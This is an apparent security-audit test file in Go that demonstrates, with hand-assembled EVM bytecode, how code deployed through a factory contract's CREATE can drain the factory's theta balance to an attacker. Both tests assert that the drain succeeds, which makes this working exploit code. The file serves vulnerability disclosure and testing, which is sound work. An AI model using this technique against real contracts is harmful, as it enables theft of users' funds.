package vm

// AUDIT PoC D1 - the identity leak also survives the *downward* frame created by
// CREATE, not just the upward callback frame.
//
// Any contract V that deploys caller-supplied bytecode (factory / deployer /
// proxy-factory pattern: `CREATE(value, offset, calldatasize)` after copying
// msg.data into memory) hands the new contract's init-code frame a
// CallerAddress equal to V itself.
//
//	attacker EOA --tx(data = drainer)--> V(factory)
//	    V: CALLDATACOPY(mem, msg.data); CREATE(...)   init frame: caller = V, self = new
//	        init code = DELEGATECALL 0xCB            => debits callerAddr = V
//
// So the attacker does not even need V to call back to an attacker-controlled
// address: V merely has to deploy code the caller supplied. Same root cause,
// no cooperation from V, different frame kind.

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
)

func hexBytes(h string) []byte {
	b, err := hex.DecodeString(h)
	if err != nil {
		panic(err)
	}
	return b
}

// factoryRuntime copies the whole calldata into memory and CREATEs it.
//
//	36 6000 6000 37      CALLDATACOPY(memOff=0, dataOff=0, len=CALLDATASIZE)
//	36 6000 6000 f0      CREATE(value=0, offset=0, size=CALLDATASIZE)
//	00                   STOP
const factoryRuntime = "366000600037" + "3660006000f000"

func TestAuditD1_CreateInitCodeInheritsIdentity(t *testing.T) {
	sv := newAuditView(t)

	factory := victimCtr
	setBalance(t, sv, factory, thetaN(100), big.NewInt(0))
	setCode(t, sv, factory, factoryRuntime)

	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	// attacker-supplied payload == the bytecode that gets deployed & executed
	initCode := hexBytes(drainerRuntime(attackerEOA))
	if _, err := runTx(t, sv, attackerEOA, factory, initCode, 4_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	victim := thetaOf(sv, factory)
	attacker := thetaOf(sv, attackerEOA)
	t.Logf("factory (victim) theta : %v", victim)
	t.Logf("attacker EOA theta     : %v", attacker)

	if victim.Sign() != 0 {
		t.Fatalf("factory not drained, balance = %v", victim)
	}
	if attacker.Cmp(thetaN(100)) != 0 {
		t.Fatalf("attacker did not receive the funds, balance = %v", attacker)
	}
}

// TestAuditD2_CreateViaContractCaller is the same primitive but the caller is
// the attacker's *contract* (a router): the tx origin never touches the
// factory, proving the drain is a property of the frame, not of the tx sender.
func TestAuditD2_CreateViaContractCaller(t *testing.T) {
	sv := newAuditView(t)

	factory := victimCtr
	setBalance(t, sv, factory, thetaN(100), big.NewInt(0))
	setCode(t, sv, factory, factoryRuntime)

	// attackerCtr: CALLDATACOPY(msg.data) ; CALL(gas, factory, 0, mem, size, 0, 0)
	router := "366000600037" + // CALLDATACOPY(mem, msg.data)
		"600060003660006000" + // outSize,outOff,inSize,inOff,value
		push20hex(factory) + "5af100"
	setCode(t, sv, attackerCtr, router)
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	initCode := hexBytes(drainerRuntime(attackerEOA))
	if _, err := runTx(t, sv, attackerEOA, attackerCtr, initCode, 4_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	t.Logf("factory (victim) theta : %v", thetaOf(sv, factory))
	t.Logf("attacker EOA theta     : %v", thetaOf(sv, attackerEOA))
	if thetaOf(sv, factory).Sign() != 0 {
		t.Fatalf("factory not drained")
	}
	if thetaOf(sv, attackerEOA).Cmp(thetaN(100)) != 0 {
		t.Fatalf("attacker did not receive the funds")
	}
}

var _ = common.Address{}
